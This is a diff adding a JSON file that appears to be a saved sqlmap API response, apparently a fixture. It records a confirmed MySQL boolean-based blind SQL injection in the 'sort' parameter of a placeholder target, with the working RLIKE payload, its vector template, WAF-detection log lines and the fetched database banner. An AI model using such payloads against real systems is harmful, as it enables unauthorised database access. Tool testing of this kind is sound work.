@@ -1,0 +1,102 @@
+{
+    "data_response": {
+        "data": [
+            {
+                "status": 1,
+                "type": 0,
+                "value": {
+                    "data": null,
+                    "query": "start=0&count=10&sort=tagname",
+                    "url": "http://target.example.com:8080/JSONTags"
+                }
+            },
+            {
+                "status": 1,
+                "type": 1,
+                "value": [
+                    {
+                        "clause": [
+                            1,
+                            2,
+                            3
+                        ],
+                        "conf": {
+                            "code": null,
+                            "notString": null,
+                            "optimize": null,
+                            "regexp": null,
+                            "string": null,
+                            "textOnly": null,
+                            "titles": null
+                        },
+                        "data": {
+                            "1": {
+                                "comment": "",
+                                "falseCode": 200,
+                                "matchRatio": 0.023,
+                                "payload": "start=0&count=10&sort=tagname RLIKE (SELECT (CASE WHEN (5190=5190) THEN 0x7461676e616d65 ELSE 0x28 END))",
+                                "templatePayload": null,
+                                "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
+                                "trueCode": 200,
+                                "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
+                                "where": 1
+                            }
+                        },
+                        "dbms": "MySQL",
+                        "dbms_version": null,
+                        "notes": [],
+                        "os": null,
+                        "parameter": "sort",
+                        "place": "GET",
+                        "prefix": "",
+                        "ptype": 1,
+                        "suffix": ""
+                    }
+                ]
+            },
+            {
+                "status": 1,
+                "type": 3,
+                "value": "5.7.18-0ubuntu0.16.04.1"
+            }
+        ],
+        "error": [],
+        "success": true
+    },
+    "log_response": {
+        "log": [
+            {
+                "level": "INFO",
+                "message": "resuming back-end DBMS 'mysql' ",
+                "time": "17:27:17"
+            },
+            {
+                "level": "INFO",
+                "message": "testing connection to the target URL",
+                "time": "17:27:17"
+            },
+            {
+                "level": "CRITICAL",
+                "message": "previous heuristics detected that the target is protected by some kind of WAF/IPS/IDS",
+                "time": "17:27:17"
+            },
+            {
+                "level": "INFO",
+                "message": "the back-end DBMS is MySQL",
+                "time": "17:27:17"
+            },
+            {
+                "level": "INFO",
+                "message": "fetching banner",
+                "time": "17:27:17"
+            },
+            {
+                "level": "INFO",
+                "message": "resumed: 5.7.18-0ubuntu0.16.04.1",
+                "time": "17:27:17"
+            }
+        ],
+        "success": true
+    },
+    "task_id": "1f626c15d69d6ccd"
+}
